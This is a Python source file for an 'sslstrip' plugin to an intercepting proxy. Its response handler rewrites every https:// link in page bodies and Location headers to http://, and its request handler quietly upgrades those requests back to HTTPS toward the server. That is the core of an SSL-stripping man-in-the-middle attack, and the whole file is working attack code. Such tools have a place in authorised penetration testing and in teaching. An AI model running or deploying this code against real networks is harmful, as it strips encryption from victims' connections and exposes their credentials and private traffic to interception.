#!/usr/bin/python3
# -*- coding: utf-8 -*-
from collections import deque
from IProxyPlugin import IProxyPlugin

import re

class ProxyPlugin(IProxyPlugin):
    replaced_urls = deque(maxlen=1024)

    def __init__(self, logger, proxyOptions):
        self.logger = logger
        self.proxyOptions = proxyOptions
        logger.info('hello world from __init__ in SSLStrip ProxyPlugin')

    @staticmethod
    def get_name():
        return 'sslstrip'

    def help(self, parser):
        pass

    def request_handler(self, req, req_body):
        if req.path in self.replaced_urls:
            req.path = req.path.replace('http://', 'https://')

    def response_handler(self, req, req_body, res, res_body):
        def replacefunc(m):
            http_url = "http://" + m.group(1)
            self.replaced_urls.append(http_url)
            return http_url

        re_https_url = r"https://([-_.!~*'()a-zA-Z0-9;/?:@&=+$,%]+)"

        if 'Location' in res.headers:
            res.headers['Location'] = re.sub(re_https_url, replacefunc, res.headers['Location'])
        return re.sub(re_https_url, replacefunc, res_body)

